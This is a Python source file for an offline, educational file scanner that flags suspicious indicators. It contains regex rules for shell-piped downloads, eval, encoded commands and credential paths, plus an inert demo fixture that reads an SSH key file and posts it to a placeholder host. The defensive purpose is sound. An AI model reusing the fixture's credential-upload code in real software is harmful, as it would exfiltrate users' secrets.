#!/usr/bin/env python3
"""Falcon Check 0.9: an offline, educational file indicator scanner.

Run: python3 falcon_check.py --demo
No scanned content is imported, evaluated, executed, uploaded, or changed.
Built-in checks are educational; optional antivirus uses installed ClamAV.
No mode offers mathematical verification of safety.
"""

import argparse
import ast
import hashlib
import os
from pathlib import Path
import re
import stat
import sys

VERSION = "0.9"
MAX_PYTHON_BYTES = 2 * 1024 * 1024
MAX_PYTHON_NODES = 100000

# Each rule has an identifier, readable title, pattern, and explanation.
# These are clues to investigate: legitimate programs can match these too.
RULES = [
    ("download-shell", "Downloaded content piped to a shell",
     r"\b(?:curl|wget)\b[^\r\n|]{0,500}\|\s*(?:bash|sh|zsh)\b",
     "A shell could run downloaded instructions. Check the source and contents."),
    ("dynamic-code", "Dynamic code execution syntax",
     r"\b(?:eval|exec)\s*\(",
     "This can turn text into code. Find where that text comes from."),
    ("encoded-content", "Encoding or decoding syntax",
     r"\b(?:b64decode|atob|frombase64string)\s*\(|\bbase64\s+(?:-d|--decode)\b",
     "Encoding is common and legitimate, but can also hide instructions."),
    ("shell-command", "Shell execution syntax",
     r"\bos\.(?:system|popen)\s*\(|\bshell\s*=\s*True\b",
     "Check whether command text includes untrusted input."),
    ("sensitive-path", "Reference to a sensitive location",
     r"(?:\.ssh[/\\]|\.aws[/\\]credentials\b|/etc/shadow\b)",
     "Check why this program needs keys, credentials, or account data."),
    ("startup", "Reference to a startup mechanism",
     r"(?:\.config[/\\]autostart\b|/etc/cron\b|\bcrontab\b)",
     "Scheduled tasks and startup entries can keep a program running later."),
    ("powershell-encoded", "PowerShell encoded-command option",
     r"\bpowershell(?:\.exe)?\b[^\r\n]{0,200}\s-(?:enc|encodedcommand)\b",
     "Review the encoded command before considering running it."),
]
COMPILED_RULES = [(key, title, re.compile(pattern, re.I), why)
                  for key, title, pattern, why in RULES]

# Plain strings for the demo, NEVER executed. The second deliberately has
# suspicious-looking words in comments, demonstrating false positives.
DEMO_ORDINARY = b'print("Hello, James!")\n'
DEMO_REVIEW = (
    b'# Harmless teaching text, not an executable payload.\n'
    b'# An article mentions eval(user_input).\n'
    b'# A backup guide mentions .ssh/id_example.\n'
    b'# A scheduling tutorial mentions crontab.\n'
)
DEMO_EVIDENCE = (
    b'# Inert teaching fixture: scan as Python; do not execute.\n'
    b'# The function is never called. The path and destination are examples.\n'
    b'def example_only():\n'
    b'    import os\n'
    b'    import requests\n'
    b'    account = "falcon-demo"\n'
    b'    base = f"/home/{account}"\n'
    b'    path = os.path.join(base, ".ssh", "id_example")\n'
    b'    with open(path, "rb") as handle:\n'
    b'        contents = handle.read()\n'
    b'    with requests.Session() as client:\n'
    b'        client.post("https://example.invalid/upload", data=contents)\n'
)


def dotted_name(node):
    """Get the written name of a function without evaluating it."""
    parts = []
    while isinstance(node, ast.Attribute):
        parts.append(node.attr)
        node = node.value
    if isinstance(node, ast.Name):
        parts.append(node.id)
        return ".".join(reversed(parts))
    return ""


def analyze_python(text):
    """Inspect source without running it; track selected simple values."""
    from falcon_python import analyze
    return analyze(text, COMPILED_RULES, MAX_PYTHON_NODES)


def analyze_bytes(data, name, mode="auto"):
    """Inspect demo/test bytes through the same backend as real files."""
    import io
    from falcon_engine import inspect_stream
    return inspect_stream(io.BytesIO(data), len(data), name, mode)


def scan_file(filename, mode="auto", cancel=None, progress=None):
    from falcon_engine import scan_file as backend_scan
    return backend_scan(filename, mode, cancel, progress)


def show_report(result):
    from falcon_explain import meaning, checks, evidence_kind, next_step
    print("\n" + "=" * 62)
    # ascii() escapes terminal controls and confusing Unicode from input.
    print("File:", ascii(result["name"]))
    print("Result:", result["status"])
    print(meaning(result))
    for label, status in checks(result):
        print(label + ":", status)
    print("Coverage:", result["coverage"])
    print("Bytes:", result["size"])
    for label, value in result.get("facts", []):
        print(label + ":", ascii(value))
    for note in result.get("notes", []):
        print("Note:", ascii(note))
    for member in result.get("members", []):
        print("  Entry:", ascii(member))
    if result.get("engine_output"):
        print("ClamAV output:")
        for line in result["engine_output"].splitlines():
            print("  " + ascii(line))
    if result["sha256"]:
        print("SHA-256:", result["sha256"])
        print("(Fingerprint only; not checked against a malware database.)")
    for finding in result["findings"]:
        location = "Line " + str(finding["line"]) if "line" in finding else finding.get("location", "Finding")
        print("\n  {}: {}".format(location, finding["title"]))
        print("  Matched:", ascii(finding["evidence"]))
        print("  Evidence type:", evidence_kind(finding))
        for step in finding.get("trace", []):
            print("  Trace:", ascii(step))
        if "resolved" in finding:
            print("  Traced value:", ascii(finding["resolved"]))
        print("  Why review:", finding["why"])
        for label, key in (("Source fact", "source_fact"), ("Inferred connection", "inference"), ("Destination", "destination"), ("Possible legitimate use", "legitimate_use"), ("Uncertainty", "uncertainty"), ("Suggested action", "remediation")):
            if finding.get(key):
                print("  " + label + ":", ascii(finding[key]))
        if finding.get('patch_span'):
            print("  Patch selection ID:", finding['id'])
    print("\nNext step:", next_step(result))
    print("No verdict here proves safety or maliciousness.")


def main():
    parser = argparse.ArgumentParser(
        description="Falcon Check " + VERSION + " - offline educational file scanner")
    parser.add_argument("file", nargs="?", help="one local file to inspect")
    parser.add_argument("--demo", action="store_true", help="inspect built-in harmless text")
    parser.add_argument("--gui", action="store_true", help="open the optional desktop window")
    parser.add_argument("--preview-fix", action="store_true", help="preview removal of a supported standalone sensitive upload in Python source")
    parser.add_argument("--save-fixed-copy", metavar="NEW_PATH", help="with --preview-fix: ask for approval, save a new file, and recheck it")
    parser.add_argument("--finding-id", help="with --preview-fix: select an upload finding ID from the report")
    parser.add_argument("--mode", choices=["combined", "auto", "python", "text", "details", "executable", "archive", "antivirus"], default="combined",
                        help="combined (default) requests built-in checks plus ClamAV; auto requests built-in checks only")
    args = parser.parse_args()
    if args.save_fixed_copy or args.finding_id:
        if not args.preview_fix:
            parser.error("--save-fixed-copy and --finding-id require --preview-fix")
    if args.preview_fix:
        if not args.file or args.gui or args.demo:
            parser.error("--preview-fix needs one source file and cannot be combined with --gui or --demo")
        from falcon_remediate import cli
        try:
            return cli(args.file, args.save_fixed_copy, args.finding_id)
        except (OSError, ValueError) as error:
            print("Patch not completed:", ascii(str(error)))
            return 2
    if args.demo and (args.file or args.gui):
        parser.error("use --demo by itself (the window has its own demo button)")
    if args.gui:
        # The terminal interface must not depend on Tkinter being installed.
        from falcon_gui import launch
        return launch(args.file or "", args.mode)
    print("FALCON CHECK " + VERSION + " | Reads files as data. No uploads or execution.")
    if args.demo:
        show_report(analyze_bytes(DEMO_ORDINARY, "ordinary-example.txt"))
        show_report(analyze_bytes(DEMO_REVIEW, "review-example.txt"))
        show_report(analyze_bytes(DEMO_REVIEW, "same-comments.py"))
        show_report(analyze_bytes(b'eval("2 + 2")\n', "direct-call.py"))
        show_report(analyze_bytes(DEMO_EVIDENCE, "evidence-demo.txt", "python"))
        print("\nAll demo examples are harmless; no example code was executed.")
        print("The same comments trigger text checks but not Python syntax checks.")
        return 0
    filename = args.file
    if filename is None:
        filename = input("Paste a file path (no surrounding quotes), then Enter: ").strip()
    if not filename:
        print("No file selected.")
        return 2
    try:
        result = scan_file(filename, args.mode)
    except (OSError, ValueError) as error:
        print("NOT INSPECTED:", ascii(str(error)))
        return 2
    show_report(result)
    return {"NO INDICATORS FOUND": 0, "NO THREATS REPORTED": 0, "NEEDS REVIEW": 1,
            "THREAT REPORTED": 1, "CANCELLED": 130, "BASIC INSPECTION": 3,
            "PARTIAL INSPECTION": 3}.get(result["status"], 2)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except (KeyboardInterrupt, EOFError):
        print("\nCancelled.")
        sys.exit(130)
